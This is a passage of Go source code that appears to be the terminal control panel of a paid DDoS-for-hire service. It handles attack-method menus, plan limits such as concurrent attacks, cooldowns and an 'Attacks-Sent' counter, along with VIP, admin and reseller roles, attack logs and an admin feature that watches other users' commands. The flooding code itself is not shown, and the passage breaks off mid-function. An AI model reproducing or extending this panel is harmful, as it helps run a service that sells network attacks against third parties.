cmd, err := this.ReadLine(false, false)
if err != nil {
this.conn.Write([]byte(fmt.Sprintf("\033[0;0m%s\033[0m\r\n", err)))
return
}

//───────────────────────────────────────────────────────────────────────────────────────────────

var history = &history{
ID:       time.Now().UnixNano(),
Username: username,
Password: password,
Admin:    userInfo.admin,
Conn:     this.conn,
Cmdhis:   cmd,
}

//───────────────────────────────────────────────────────────────────────────────────────────────

historyMutex.Lock()
cmds[history.ID] = history
historyMutex.Unlock()
sessionMutex.Lock()
username5 := username
recent := cmd

//───────────────────────────────────────────────────────────────────────────────────────────────

for _, s := range sessions {
if s.Listen == true {
this.conn.Write([]byte("\033[0m\r\n"))
fmt.Fprintf(s.Conn, "\033[0;97m%s -> \033[0;96m%s\033[0m\r\n", username5, recent)
continue
}

continue
}

sessionMutex.Unlock()

//───────────────────────────────────────────────────────────────────────────────────────────────

if cmd == "EXIT" || cmd == "exit" || cmd == "LOGOUT" || cmd == "logout" || cmd == "CLOSE" || cmd == "close" || cmd == "QUIT" || cmd == "quit" {
fmt.Fprint(this.conn, "\033c")
this.conn.Write([]byte("\033[0m\r\n"))
this.conn.Write([]byte("\033[0;4;31mEnding Session\033[0;97m.\033[0m\033[?25l\r\n"))
time.Sleep(500 * time.Millisecond)
return
}

//───────────────────────────────────────────────────────────────────────────────────────────────

if cmd == "RESET" || cmd == "reset" || cmd == "DEFAULT" || cmd == "default" {
this.conn.Write([]byte("\033[0m\r\n"))
this.conn.Write([]byte("\033[0mTerminal Size Set To (24x80).\r\n"))
return
}

//───────────────────────────────────────────────────────────────────────────────────────────────

session.LastCommand = time.Now()

//───────────────────────────────────────────────────────────────────────────────────────────────

if cmd == "" {
this.conn.Write([]byte("\033[0m\r\n"))
this.conn.Write([]byte("\033[0mNo Command Found.\033[0m\r\n"))
continue
}

if cmd == "'" {
this.conn.Write([]byte("\033[0m\r\n"))
this.conn.Write([]byte("\033[0mNo Command Found.\033[0m\r\n"))
continue
}

if cmd == "`" {
this.conn.Write([]byte("\033[0m\r\n"))
this.conn.Write([]byte("\033[0mNo Command Found.\033[0m\r\n"))
continue
}

if cmd == "~" {
this.conn.Write([]byte("\033[0m\r\n"))
this.conn.Write([]byte("\033[0mNo Command Found.\033[0m\r\n"))
continue
}

if cmd == "," {
this.conn.Write([]byte("\033[0m\r\n"))
this.conn.Write([]byte("\033[0mNo Command Found.\033[0m\r\n"))
continue
}

if cmd == "'" {
this.conn.Write([]byte("\033[0m\r\n"))
this.conn.Write([]byte("\033[0mNo Command Found.\033[0m\r\n"))
continue
}

if cmd == "|" {
this.conn.Write([]byte("\033[0m\r\n"))
this.conn.Write([]byte("\033[0mNo Command Found.\033[0m\r\n"))
continue
}

if cmd == "=" {
this.conn.Write([]byte("\033[0m\r\n"))
this.conn.Write([]byte("\033[0mNo Command Found.\033[0m\r\n"))
continue
}

if cmd == ";" {
this.conn.Write([]byte("\033[0m\r\n"))
this.conn.Write([]byte("\033[0mNo Command Found.\033[0m\r\n"))
continue
}

if cmd == ":" {
this.conn.Write([]byte("\033[0m\r\n"))
this.conn.Write([]byte("\033[0mNo Command Found.\033[0m\r\n"))
continue
}

if cmd == "{" {
this.conn.Write([]byte("\033[0m\r\n"))
this.conn.Write([]byte("\033[0mNo Command Found.\033[0m\r\n"))
continue
}

if cmd == "}" {
this.conn.Write([]byte("\033[0m\r\n"))
this.conn.Write([]byte("\033[0mNo Command Found.\033[0m\r\n"))
continue
}

if cmd == "[" {
this.conn.Write([]byte("\033[0m\r\n"))
this.conn.Write([]byte("\033[0mNo Command Found.\033[0m\r\n"))
continue
}

if cmd == "]" {
this.conn.Write([]byte("\033[0m\r\n"))
this.conn.Write([]byte("\033[0mNo Command Found.\033[0m\r\n"))
continue
}

if cmd == "this.conn.Write([]byte" {
this.conn.Write([]byte("\033[0m\r\n"))
this.conn.Write([]byte("\033[0mNo Command Found.\033[0m\r\n"))
continue
}

if cmd == "byte" {
this.conn.Write([]byte("\033[0m\r\n"))
this.conn.Write([]byte("\033[0mNo Command Found.\033[0m\r\n"))
continue
}

//───────────────────────────────────────────────────────────────────────────────────────────────

if len(cmd) > 280 {
fmt.Fprint(this.conn, "\033c")
this.conn.Write([]byte("\033[0;4;31mKilling Session\033[0;97m.\033[0m\r\n"))
this.conn.Write([]byte("\033[0;31mReason: Spamming Over \033[0;4;97m200\033[0;31m Chars.\033[0m\033[?25l\r\n"))
time.Sleep(500 * time.Millisecond)
return
}

//───────────────────────────────────────────────────────────────────────────────────────────────

f, err := os.OpenFile("logs/server-logs.txt", os.O_APPEND|os.O_WRONLY, 0644)
if err != nil {
fmt.Println(err)
return
}

clog := time.Now()
newLine := clog.Format("Jan 02 2006") + " " + clog.Format("15:04:05") + " | " + username + " | " + cmd
_, err = fmt.Fprintln(f, newLine)
fmt.Println("USERNAME: " + username + " -> EXECUTED COMMAND -> [" + cmd + "]")
if err != nil {
fmt.Println(err)
f.Close()
return
}

err = f.Close()
if err != nil {
fmt.Println(err)
return
}

//───────────────────────────────────────────────────────────────────────────────────────────────

if cmd == "HOME" || cmd == "home" {

motdmsg, err := ioutil.ReadFile("./branding/live-msg.tfx")
page, err := ioutil.ReadFile("./branding/home-splash.tfx")
if err != nil {
}


this.conn.Write([]byte("\033c"))
this.conn.Write([]byte(fmt.Sprintf("\033[38;5;125mLive\033[0m Message\033[38;5;129m [\033[38;5;126m-\033[38;5;129m] \033[0m%s\033[0m\r\n", string(motdmsg))))
this.conn.Write([]byte(fmt.Sprintf("\033[0m%s\033[0m\r\n", string(page))))
continue
}

//───────────────────────────────────────────────────────────────────────────────────────────────

if cmd == "CLEAR" || cmd == "clear" || cmd == "CLS" || cmd == "cls" || cmd == "C" || cmd == "c" || cmd == "CL" || cmd == "cl" || cmd == "cle" || cmd == "clea" {


motdmsg, err := ioutil.ReadFile("./branding/live-msg.tfx")
page, err := ioutil.ReadFile("./branding/clear-splash.tfx")
if err != nil {
}
if _, err := termfxV2("animation1.tfx", &userInfo, this.conn, false, false); err != nil {
this.conn.Write([]byte(fmt.Sprintf("\033[0m %s \033[0m", err.Error())))
fmt.Println(err)
f.Close()
continue
}

this.conn.Write([]byte("\033c"))
this.conn.Write([]byte(fmt.Sprintf("\033[38;5;125mLive\033[0m Message\033[38;5;129m [\033[38;5;126m-\033[38;5;129m] \033[0m%s\033[0m\r\n", string(motdmsg))))
this.conn.Write([]byte(fmt.Sprintf("\033[0m%s\033[0m\r\n", string(page))))
continue
}

//───────────────────────────────────────────────────────────────────────────────────────────────

if cmd == "HELP" || cmd == "help" || cmd == "Help" || cmd == "?" {



motdmsg, err := ioutil.ReadFile("./branding/live-msg.tfx")
page, err := ioutil.ReadFile("./branding/help-page.tfx")
if err != nil {
}

stringjsonfile := string(page)
jsonprompt3 := strings.Replace(stringjsonfile, "<<$username>>", userInfo.username, -1)
this.conn.Write([]byte(""+jsonprompt3+""))
this.conn.Write([]byte("\033c"))
this.conn.Write([]byte(fmt.Sprintf("\033[38;5;125mLive\033[0m Message\033[38;5;129m [\033[38;5;126m-\033[38;5;129m] \033[0m%s\033[0m\r\n", string(motdmsg))))
this.conn.Write([]byte(fmt.Sprintf("\033[0m%s\033[0m\r\n", string(jsonprompt3))))
continue
}

//───────────────────────────────────────────────────────────────────────────────────────────────

if cmd == "METHODS" || cmd == "methods" || cmd == "ATTACKS" || cmd == "attacks" || cmd == "HUB" || cmd == "hub" {

motdmsg, err := ioutil.ReadFile("./branding/live-msg.tfx")
page, err := ioutil.ReadFile("./branding/method-hub.tfx")
if err != nil {
}


this.conn.Write([]byte("\033c"))
this.conn.Write([]byte(fmt.Sprintf("\033[38;5;125mLive\033[0m Message\033[38;5;129m [\033[38;5;126m-\033[38;5;129m] \033[0m%s\033[0m\r\n", string(motdmsg))))
this.conn.Write([]byte(fmt.Sprintf("\033[0m%s\033[0m\r\n", string(page))))
continue
}

//───────────────────────────────────────────────────────────────────────────────────────────────

if cmd == "TOOLS" || cmd == "tools" {
if _, err := termfxV2("tools.tfx", &userInfo, this.conn, false, false); err != nil {
this.conn.Write([]byte(fmt.Sprintf("\033[0m %s \033[0m", err.Error())))
fmt.Println(err)
f.Close()
continue
}
continue
}

//───────────────────────────────────────────────────────────────────────────────────────────────

if cmd == "MODERATION" || cmd == "moderation" || cmd == "MOD" || cmd == "mod" || cmd == "ADMIN" || cmd == "admin" || cmd == "RESELLER" || cmd == "reseller" {

if userInfo.seller == true {
goto skipadminauth2modfer
}

if userInfo.admin == false {
this.conn.Write([]byte("\033[0m\r\n"))
fmt.Fprint(this.conn, "\033[0;31mYour Role Doesn't Have Permission To Execute This Command.\033[0m\r\n")
continue
}

skipadminauth2modfer:
motdmsg, err := ioutil.ReadFile("./branding/live-msg.tfx")
page, err := ioutil.ReadFile("./branding/mod-hub.tfx")
if err != nil {
}

this.conn.Write([]byte("\033c"))
this.conn.Write([]byte(fmt.Sprintf("\033[38;5;125mLive\033[0m Message\033[38;5;129m [\033[38;5;126m-\033[38;5;129m] \033[0m%s\033[0m\r\n", string(motdmsg))))
this.conn.Write([]byte(fmt.Sprintf("\033[0m%s\033[0m\r\n", string(page))))
continue
}

//───────────────────────────────────────────────────────────────────────────────────────────────

if cmd == "CREDITS" || cmd == "credits" || cmd == "CONTACTS" || cmd == "contacts" {

motdmsg, err := ioutil.ReadFile("./branding/live-msg.tfx")
page, err := ioutil.ReadFile("./branding/server-credits.tfx")
if err != nil {
}

fmt.Fprint(this.conn, "\033c")
this.conn.Write([]byte("\033[0m\r\n"))
this.conn.Write([]byte("\033[0;90m Opening File.\r\n"))
time.Sleep(300 * time.Millisecond)
fmt.Fprint(this.conn, "\033c")
this.conn.Write([]byte("\033[0m\r\n"))
this.conn.Write([]byte("\033[0;90m Opening File..\r\n"))
time.Sleep(300 * time.Millisecond)
fmt.Fprint(this.conn, "\033c")
this.conn.Write([]byte("\033[0m\r\n"))
this.conn.Write([]byte("\033[0;90m Opening File...\r\n"))
time.Sleep(400 * time.Millisecond)

this.conn.Write([]byte("\033c"))
this.conn.Write([]byte(fmt.Sprintf("\033[38;5;125mLive\033[0m Message\033[38;5;129m [\033[38;5;126m-\033[38;5;129m] \033[0m%s\033[0m\r\n", string(motdmsg))))
this.conn.Write([]byte(fmt.Sprintf("\033[0m%s\033[0m\r\n", string(page))))
continue
}

//───────────────────────────────────────────────────────────────────────────────────────────────

if cmd == "reload" {
if userInfo.admin == false {
fmt.Fprint(this.conn, "\033[91mYou Must Be An Admin!\033[0m\r\n")
continue
}

clearTerm = true
if clearTerm == true {
fmt.Printf("\033c")
}
clearTerm = false
err := CompleteLoad()
err = CompleteLoad2()
err = CompleteLoad3()
err, count := LoadBranding("branding")
if err != nil {
fmt.Printf("\033[0m[\033[101;30;140m FATAL \033[0;0m] failed to load file %s\r\n\033[0m-> \033[0m", err)
continue
}
fmt.Printf("\033[0m[\033[102;30;140m OK \033[0;0m] loaded `branding`, `json`, `loader`\r\n\033[0m")
fmt.Printf("\033[0m[\033[102;30;140m OK \033[0;0m] total branding files: " + strconv.Itoa(count) + "\r\n\033[0m")
this.conn.Write([]byte("\r\n\033[0mterminal cleared\r\n"))
continue
}

//───────────────────────────────────────────────────────────────────────────────────────────────

if cmd == "RULES" || cmd == "rules" || cmd == "TOS" || cmd == "tos" || cmd == "TERMS" || cmd == "terms" {

motdmsg, err := ioutil.ReadFile("./branding/live-msg.tfx")
page, err := ioutil.ReadFile("./branding/terms-of-service.tfx")
if err != nil {
}

fmt.Fprint(this.conn, "\033c")
this.conn.Write([]byte("\033[0m\r\n"))
this.conn.Write([]byte("\033[0;90m Opening File.\r\n"))
time.Sleep(300 * time.Millisecond)
fmt.Fprint(this.conn, "\033c")
this.conn.Write([]byte("\033[0m\r\n"))
this.conn.Write([]byte("\033[0;90m Opening File..\r\n"))
time.Sleep(300 * time.Millisecond)
fmt.Fprint(this.conn, "\033c")
this.conn.Write([]byte("\033[0m\r\n"))
this.conn.Write([]byte("\033[0;90m Opening File...\r\n"))
time.Sleep(400 * time.Millisecond)

this.conn.Write([]byte("\033c"))
this.conn.Write([]byte(fmt.Sprintf("\033[38;5;125mLive\033[0m Message\033[38;5;129m [\033[38;5;126m-\033[38;5;129m] \033[0m%s\033[0m\r\n", string(motdmsg))))
this.conn.Write([]byte(fmt.Sprintf("\033[0m%s\033[0m\r\n", string(page))))
continue
}
//───────────────────────────────────────────────────────────────────────────────────────────────

//───────────────────────────────────────────────────────────────────────────────────────────────

if cmd == "LOGS" || cmd == "logs" || cmd == "LOGGER" || cmd == "logger" {

if userInfo.admin == false {
this.conn.Write([]byte("\033[0m\r\n"))
fmt.Fprint(this.conn, "\033[0;31mYour Role Doesn't Have Permission To Execute This Command.\033[0m\r\n")
continue
}

motdmsg, err := ioutil.ReadFile("./branding/live-msg.tfx")
page, err := ioutil.ReadFile("./branding/log-page.tfx")
if err != nil {
}

this.conn.Write([]byte("\033c"))
this.conn.Write([]byte(fmt.Sprintf("\033[38;5;125mLive\033[0m Message\033[38;5;129m [\033[38;5;126m-\033[38;5;129m] \033[0m%s\033[0m\r\n", string(motdmsg))))
this.conn.Write([]byte(fmt.Sprintf("\033[0m%s\033[0m\r\n", string(page))))
continue
}

//───────────────────────────────────────────────────────────────────────────────────────────────

if cmd == "METHODPAGENAME1" || cmd == "methodpagename1" {

motdmsg, err := ioutil.ReadFile("./branding/live-msg.tfx")
page, err := ioutil.ReadFile("./methodpages/methodpagefilename.tfx")
if err != nil {
}

this.conn.Write([]byte("\033c"))
this.conn.Write([]byte(fmt.Sprintf("\033[38;5;125mLive\033[0m Message\033[38;5;129m [\033[38;5;126m-\033[38;5;129m] \033[0m%s\033[0m\r\n", string(motdmsg))))
this.conn.Write([]byte(fmt.Sprintf("\033[0m%s\033[0m\r\n", string(page))))
continue
}

//───────────────────────────────────────────────────────────────────────────────────────────────

if cmd == "METHODPAGENAME2" || cmd == "methodpagename2" {

motdmsg, err := ioutil.ReadFile("./branding/live-msg.tfx")
page, err := ioutil.ReadFile("./methodpages/methodpagefilename.tfx")
if err != nil {
}

this.conn.Write([]byte("\033c"))
this.conn.Write([]byte(fmt.Sprintf("\033[38;5;125mLive\033[0m Message\033[38;5;129m [\033[38;5;126m-\033[38;5;129m] \033[0m%s\033[0m\r\n", string(motdmsg))))
this.conn.Write([]byte(fmt.Sprintf("\033[0m%s\033[0m\r\n", string(page))))
continue
}

//───────────────────────────────────────────────────────────────────────────────────────────────

if cmd == "listen on" {

if userInfo.admin == false {
this.conn.Write([]byte("\033[0m\r\n"))
fmt.Fprint(this.conn, "\033[0;31mYour Role Doesn't Have Permission To Execute This Command.\033[0m\r\n")
continue
}

session.Listen = true
this.conn.Write([]byte("\033[0m\r\n"))
this.conn.Write([]byte("\033[0mToggled session.Listen = \033[0;92mtrue\033[0m\r\n"))
continue
}

if cmd == "listen off" {

if userInfo.admin == false {
this.conn.Write([]byte("\033[0m\r\n"))
fmt.Fprint(this.conn, "\033[0;31mYour Role Doesn't Have Permission To Execute This Command.\033[0m\r\n")
continue
}

session.Listen = false
this.conn.Write([]byte("\033[0m\r\n"))
this.conn.Write([]byte("\033[0mToggled session.Listen = \033[0;31mfalse\033[0m\r\n"))
continue
}

//───────────────────────────────────────────────────────────────────────────────────────────────

if cmd == "lock on" {

if userInfo.admin == false {
this.conn.Write([]byte("\033[0m\r\n"))
fmt.Fprint(this.conn, "\033[0;31mYour Role Doesn't Have Permission To Execute This Command.\033[0m\r\n")
continue
}

lock = 1
this.conn.Write([]byte("\033[0m\r\n"))
this.conn.Write([]byte(fmt.Sprintf("\033[0mToggled session.Lock = \033[0;93m%d\033[0m/\033[0;93m1\033[0m\r\n", lock)))
continue
}

if cmd == "lock off" {

if userInfo.admin == false {
this.conn.Write([]byte("\033[0m\r\n"))
fmt.Fprint(this.conn, "\033[0;31mYour Role Doesn't Have Permission To Execute This Command.\033[0m\r\n")
continue
}

lock = 0
this.conn.Write([]byte("\033[0m\r\n"))
this.conn.Write([]byte(fmt.Sprintf("\033[0mToggled session.Lock = \033[0;93m%d\033[0m/\033[0;93m1\033[0m\r\n", lock)))
continue
}

//───────────────────────────────────────────────────────────────────────────────────────────────

if userInfo.admin == true && cmd == "LIVEMSG" || userInfo.admin == true && cmd == "livemsg" {

this.conn.Write([]byte("\033[0m\r\n"))
this.conn.Write([]byte("\033[0;97mNew Message\033[0;96m: "))
msg, err := this.ReadLine(false, true)
if err != nil {
return
}

os.Remove("./branding/live-msg.tfx")
f, err1 := os.Create("./branding/live-msg.tfx")
if err1 != nil {
f.Close()
return
}

_, err2 := f.WriteString(msg)
if err2 != nil {
f.Close()
return
}

this.conn.Write([]byte("\033[0m\r\n"))
this.conn.Write([]byte("\033[0;97mChanged live.Message\033[0m\r\n"))
continue
}

//───────────────────────────────────────────────────────────────────────────────────────────────

if cmd == "PLAN" || cmd == "plan" || cmd == "ACC" || cmd == "acc" || cmd == "STATS" || cmd == "stats" || cmd == "STATUS" || cmd == "status" || cmd == "ACCSTATS" || cmd == "accstats" {
var unixTime int64 = userInfo.expiry
var premium string
var home string
var vip string
var accstat string
t := time.Unix(unixTime, 0)
Expdate := t.Format(time.UnixDate)

if userInfo.premium == true {
premium = "\033[0;92mTrue\033[0m"
} else {
premium = "\033[0;31mFalse\033[0m"
}

if userInfo.home == true {
home = "\033[0;92mTrue\033[0m"
} else {
home = "\033[0;31mFalse\033[0m"
}

if userInfo.vip == true {
vip = "\033[0;92mTrue\033[0m"
} else {
vip = "\033[0;31mFalse\033[0m"
}

if userInfo.expiry < 93 {
accstat = "\033[97mMonthly-Plan\033[0m"
} else {
accstat = "\033[97mCustom-Plan\033[0m"
}

this.conn.Write([]byte("\033[0m\r\n"))
this.conn.Write([]byte(fmt.Sprintf("\033[0;97mAccount Name ~ \033[0;96m%s\033[0m\r\n", string(username))))
this.conn.Write([]byte(fmt.Sprintf("\033[0;97mHome-Access ~ \033[0;96m%s\033[0m\r\n", string(home))))
this.conn.Write([]byte(fmt.Sprintf("\033[0;97mVIP-Access ~ \033[0;96m%s\033[0m\r\n", string(vip))))
this.conn.Write([]byte(fmt.Sprintf("\033[0;97mPremium-Access ~ \033[0;96m%s\033[0m\r\n", string(premium))))
this.conn.Write([]byte(fmt.Sprintf("\033[0;97mMax-Home-Time ~ \033[0;96m%d\033[0m\r\n", userInfo.hometime)))
this.conn.Write([]byte(fmt.Sprintf("\033[0;97mCooldown ~ \033[0;96m%d\033[0m\r\n", userInfo.cooldown)))
this.conn.Write([]byte(fmt.Sprintf("\033[0;97mConcurrents ~ \033[0;96m%d\033[0m\r\n", userInfo.concurrents)))
this.conn.Write([]byte(fmt.Sprintf("\033[0;97mAttacks-Sent ~ \033[0;96m%s\033[0m\r\n", strconv.Itoa(database.MySent(userInfo.username)))))
this.conn.Write([]byte(fmt.Sprintf("\033[0;97mAccStatus ~ \033[0;96m%s\033[0m\r\n", string(accstat))))
this.conn.Write([]byte(fmt.Sprintf("\033[0;97mExpDate ~ \033[0;96m%s\033[0m\r\n", string(Expdate))))
continue
}

//───────────────────────────────────────────────────────────────────────────────────────────────

if cmd == "SERVERLOGS" || cmd == "serverlogs" {

if userInfo.admin == false {
this.conn.Write([]byte("\033[0m\r\n"))
fmt.Fprint(this.conn, "\033[0;31mYour Role Doesn't Have Permission To Execute This Command.\033[0m\r\n")
continue
}

fmt.Fprint(this.conn, "\033c")
file, err := os.Open("logs/server-logs.txt")

if err != nil {
this.conn.Write([]byte("\033[0m\r\n"))
log.Fatalf("Failed To Open Command Logs")

}
scanner := bufio.NewScanner(file)
scanner.Split(bufio.ScanLines)
var text []string

for scanner.Scan() {
text = append(text, scanner.Text())
}

file.Close()

for _, each_ln := range text {
this.conn.Write([]byte(each_ln + "\r\n"))
}

continue
}

//───────────────────────────────────────────────────────────────────────────────────────────────

if cmd == "LOGINLOGS" || cmd == "loginlogs" {

if userInfo.admin == false {
this.conn.Write([]byte("\033[0m\r\n"))
fmt.Fprint(this.conn, "\033[0;31mYour Role Doesn't Have Permission To Execute This Command.\033[0m\r\n")
continue
}

fmt.Fprint(this.conn, "\033c")
file, err := os.Open("logs/login-attempts.txt")

if err != nil {
this.conn.Write([]byte("\033[0m\r\n"))
log.Fatalf("Failed To Open Login Logs")

}
scanner := bufio.NewScanner(file)
scanner.Split(bufio.ScanLines)
var text []string

for scanner.Scan() {
text = append(text, scanner.Text())
}

file.Close()

for _, each_ln := range text {
this.conn.Write([]byte(each_ln + "\r\n"))
}

continue
}

//───────────────────────────────────────────────────────────────────────────────────────────────

if cmd == "FAILEDLOGS" || cmd == "failedlogs" {

if userInfo.admin == false {
this.conn.Write([]byte("\033[0m\r\n"))
fmt.Fprint(this.conn, "\033[0;31mYour Role Doesn't Have Permission To Execute This Command.\033[0m\r\n")
continue
}

fmt.Fprint(this.conn, "\033c")
file, err := os.Open("logs/failed-attempts.txt")

if err != nil {
this.conn.Write([]byte("\033[0m\r\n"))
log.Fatalf("Failed To Open Failed Login Logs")

}
scanner := bufio.NewScanner(file)
scanner.Split(bufio.ScanLines)
var text []string

for scanner.Scan() {
text = append(text, scanner.Text())
}

file.Close()

for _, each_ln := range text {
this.conn.Write([]byte(each_ln + "\r\n"))
}

continue
}

//───────────────────────────────────────────────────────────────────────────────────────────────

if cmd == "ADMINLOGS" || cmd == "adminlogs" {

if userInfo.admin == false {
this.conn.Write([]byte("\033[0m\r\n"))
fmt.Fprint(this.conn, "\033[0;31mYour Role Doesn't Have Permission To Execute This Command.\033[0m\r\n")
continue
}

fmt.Fprint(this.conn, "\033c")
file, err := os.Open("logs/admin-logs.txt")

if err != nil {
this.conn.Write([]byte("\033[0m\r\n"))
log.Fatalf("Failed To Open Account Logs")

}
scanner := bufio.NewScanner(file)
scanner.Split(bufio.ScanLines)
var text []string

for scanner.Scan() {
text = append(text, scanner.Text())
}

file.Close()

for _, each_ln := range text {
this.conn.Write([]byte(each_ln + "\r\n"))
}

continue
}

//───────────────────────────────────────────────────────────────────────────────────────────────

if cmd == "ATTACKLOGS" || cmd == "attacklogs" {

if userInfo.admin == false {
this.conn.Write([]byte("\033[0m\r\n"))
fmt.Fprint(this.conn, "\033[0;31mYour Role Doesn't Have Permission To Execute This Command.\033[0m\r\n")
continue
}

fmt.Fprint(this.conn, "\033c")
file, err := os.Open("logs/attack-logs.txt")

if err != nil {
this.conn.Write([]byte("\033[0m\r\n"))
log.Fatalf("Failed To Open Attack Logs")

}
scanner := bufio.NewScanner(file)
scanner.Split(bufio.ScanLines)
var text []string

for scanner.Scan() {
text = append(text, scanner.Text())
}

file.Close()

for _, each_ln := range text {
this.conn.Write([]byte(each_ln + "\r\n"))
}

continue
}

//───────────────────────────────────────────────────────────────────────────────────────────────

args := strings.Split(cmd, " ")
switch strings.ToLower(args[0]) {
case "passwd":

this.conn.Write([]byte("\033[0m\r\n"))
fmt.Fprint(this.conn, "\033[0;97mCurrent Password:\033[0;96m ")
currentPassword, err := this.ReadLine(true, true)
if err != nil {
return
}

if currentPassword != password {
this.conn.Write([]byte("\033[0m\r\n"))
fmt.Fprintln(this.conn, "\033[0;31mIncorrect Password.\033[0m\r")
continue
}

this.conn.Write([]byte("\033[0m\r\n"))
fmt.Fprint(this.conn, "\033[0;97mNew Password:\033[0;96m ")
newPassword, err := this.ReadLine(true, true)
if err != nil {
return
}

this.conn.Write([]byte("\033[0m\r\n"))
fmt.Fprint(this.conn, "\033[0;97mConfirm Password:\033[0;96m ")
confirmPassword, err := this.ReadLine(true, true)
if err != nil {
return
}

if len(newPassword) < 10 {
this.conn.Write([]byte("\033[0m\r\n"))
fmt.Fprintln(this.conn, "\033[0;31mMust Be 10 Or More Characters.\033[0m\r")
continue
}

if confirmPassword != newPassword {
this.conn.Write([]byte("\033[0m\r\n"))
fmt.Fprintln(this.conn, "\033[0;31mPassword's Do Not Match.\033[0m\r")
continue
}

if database.ChangeUsersPassword(username, newPassword) == false {
this.conn.Write([]byte("\033[0m\r\n"))
fmt.Fprintln(this.conn, "\033[0;31mFailed.\033[0m\r")
continue
}

this.conn.Write([]byte("\033[0m\r\n"))
fmt.Fprintln(this.conn, "\033[0;97mMaster Password Changed.\033[0m\r")
password = newPassword
continue

//───────────────────────────────────────────────────────────────────────────────────────────────

case "vip=true":

if userInfo.admin == false {
this.conn.Write([]byte("\033[0m\r\n"))
fmt.Fprint(this.conn, "\033[0;31mYour Role Doesn't Have Permission To Execute This Command.\033[0m\r\n")
continue
}

if len(args) < 2 {
this.conn.Write([]byte("\033[0m\r\n"))
fmt.Fprintln(this.conn, "\033[97mSyntax: vip=true (\033[0;96musername\033[97m)\033[0m\r")
continue
}

user, err := database.GetUser(args[1])
if err != nil {
this.conn.Write([]byte("\033[0m\r\n"))
fmt.Fprintln(this.conn, "\033[0;31mInvalid User.\033[0m\r")
continue
}

if database.MakeVip(user.username) == false {
this.conn.Write([]byte("\033[0m\r\n"))
fmt.Fprintln(this.conn, "\033[0;31mFailed.\033[0m\r")
continue
}

f, err := os.OpenFile("logs/admin-logs.txt", os.O_APPEND|os.O_WRONLY, 0644)
if err != nil {
fmt.Println(err)
return
}

clog := time.Now()
newLine := clog.Format("Date: Jan 02 2006") + " | Admin: " + username + " -> Added VIP To: " + user.username + ""
_, err = fmt.Fprintln(f, newLine)
if err != nil {
fmt.Println(err)
f.Close()
return
}

err = f.Close()
if err != nil {
fmt.Println(err)
return
}

this.conn.Write([]byte("\033[0m\r\n"))
fmt.Fprintln(this.conn, "\033[0;97mVIP Access \033[0;92mGiven\033[0;97m To: \033[0;96m" + user.username + "\033[0m\r")
continue

//───────────────────────────────────────────────────────────────────────────────────────────────

case "vip=false":

if userInfo.admin == false {
this.conn.Write([]byte("\033[0m\r\n"))
fmt.Fprint(this.conn, "\033[0;31mYour Role Doesn't Have Permission To Execute This Command.\033[0m\r\n")
continue
}

if len(args) < 2 {
this.conn.Write([]byte("\033[0m\r\n"))
fmt.Fprintln(this.conn, "\033[0;97mSyntax: vip=false (\033[0;96musername\033[0;97m)\033[0m\r")
continue
}

user, err := database.GetUser(args[1])
if err != nil {
this.conn.Write([]byte("\033[0m\r\n"))
fmt.Fprintln(this.conn, "\033[0;31mInvalid User.\033[0m\r")
continue
}

if database.RemoveVip(user.username) == false {
this.conn.Write([]byte("\033[0m\r\n"))
fmt.Fprintln(this.conn, "\033[0;31mFailed.\033[0m\r")
continue
}

f, err := os.OpenFile("logs/admin-logs.txt", os.O_APPEND|os.O_WRONLY, 0644)
if err != nil {
fmt.Println(err)
return
}

clog := time.Now()
newLine := clog.Format("Date: Jan 02 2006") + " | Admin: " + username + " -> Revoked VIP To: " + user.username + ""
_, err = fmt.Fprintln(f, newLine)
if err != nil {
fmt.Println(err)
f.Close()
return
}

err = f.Close()
if err != nil {
fmt.Println(err)
return
}

this.conn.Write([]byte("\033[0m\r\n"))
fmt.Fprintln(this.conn, "\033[0;97mVIP Access \033[0;31mRevoked\033[0;97m From: \033[0;96m"+user.username+"\033[0m\r")
continue

//───────────────────────────────────────────────────────────────────────────────────────────────

case "admin=false":

if userInfo.admin == false {
this.conn.Write([]byte("\033[0m\r\n"))
fmt.Fprint(this.conn, "\033[0;31mYour Role Doesn't Have Permission To Execute This Command.\033[0m\r\n")
continue
}

if len(args) < 2 {
this.conn.Write([]byte("\033[0m\r\n"))
fmt.Fprintln(this.conn, "\033[0;97mSyntax: admin=false (\033[0;96musername\033[0;97m)\033[0m\r")
continue
}

user, err := database.GetUser(args[1])
if err != nil {
this.conn.Write([]byte("\033[0m\r\n"))
fmt.Fprintln(this.conn, "\033[0;31mInvalid User.\033[0m\r")
continue
}

if database.RemoveAdmin(user.username) == false {
this.conn.Write([]byte("\033[0m\r\n"))
fmt.Fprintln(this.conn, "\033[0;31mFailed.\033[0m\r")
continue
}

f, err := os.OpenFile("logs/admin-logs.txt", os.O_APPEND|os.O_WRONLY, 0644)
if err != nil {
fmt.Println(err)
return
}

clog := time.Now()
newLine := clog.Format("Date: Jan 02 2006") + " | Admin: " + username + " | Revoked Admin To: " + user.username + ""
_, err = fmt.Fprintln(f, newLine)
if err != nil {
fmt.Println(err)
f.Close()
return
}

err = f.Close()
if err != nil {
fmt.Println(err)
return
}

this.conn.Write([]byte("\033[0m\r\n"))
fmt.Fprintln(this.conn, "\033[0;97mAdmin \033[0;31mRevoked\033[0;97m. \033[0;96m"+user.username+"\033[0m\r")
continue

//───────────────────────────────────────────────────────────────────────────────────────────────

case "admin=true":

if userInfo.admin == false {
this.conn.Write([]byte("\033[0m\r\n"))
fmt.Fprint(this.conn, "\033[0;31mYour Role Doesn't Have Permission To Execute This Command.\033[0m\r\n")
continue
}

if len(args) < 2 {
this.conn.Write([]byte("\033[0m\r\n"))
fmt.Fprintln(this.conn, "\033[0;97mSyntax: admin=true (\033[0;96musername\033[0;97m)\033[0m\r")
continue
}

user, err := database.GetUser(args[1])
if err != nil {
this.conn.Write([]byte("\033[0m\r\n"))
fmt.Fprintln(this.conn, "\033[0;31mInvalid User.\033[0m\r")
continue
}

if database.MakeAdmin(user.username) == false {
this.conn.Write([]byte("\033[0m\r\n"))
fmt.Fprintln(this.conn, "\033[0;31mFailed.\033[0m\r")
continue
}

f, err := os.OpenFile("logs/admin-logs.txt", os.O_APPEND|os.O_WRONLY, 0644)
if err != nil {
fmt.Println(err)
return
}

clog := time.Now()
newLine := clog.Format("Date: Jan 02 2006") + " | Admin: " + username + " -> Added Admin To: " + user.username + ""
_, err = fmt.Fprintln(f, newLine)
if err != nil {
fmt.Println(err)
f.Close()
return
}

err = f.Close()
if err != nil {
fmt.Println(err)
return
}

this.conn.Write([]byte("\033[0m\r\n"))
